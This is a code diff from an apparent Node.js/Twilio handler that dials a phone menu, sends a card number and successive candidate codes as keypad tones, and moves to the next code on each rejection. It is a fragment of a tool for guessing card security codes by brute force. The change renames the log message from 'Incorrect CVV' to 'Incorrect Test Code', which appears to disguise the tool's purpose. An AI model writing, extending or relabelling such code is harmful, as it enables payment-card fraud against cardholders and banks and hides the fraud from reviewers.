@@ -100,7 +100,7 @@ export const handleTryCode = async (req, res) => {
             twiml.pause({ length: waitSeconds });
             twiml.play({ digits: `ww${baseCard}wwwwwwww${codeStr}` });
         } else {
-            batchLogs.push(`IVR says "Incorrect CVV" for ${codeStr}. Trying next...`);
+            batchLogs.push(`IVR says "Incorrect Test Code" for ${codeStr}. Trying next...`);
             batchLogs.push(`DTMF Sent: ${baseCard}:${codeStr}`);
             // Wait 0.5 seconds (1 'w') to let IVR speak before playing next
             twiml.play({ digits: `w${codeStr}` });
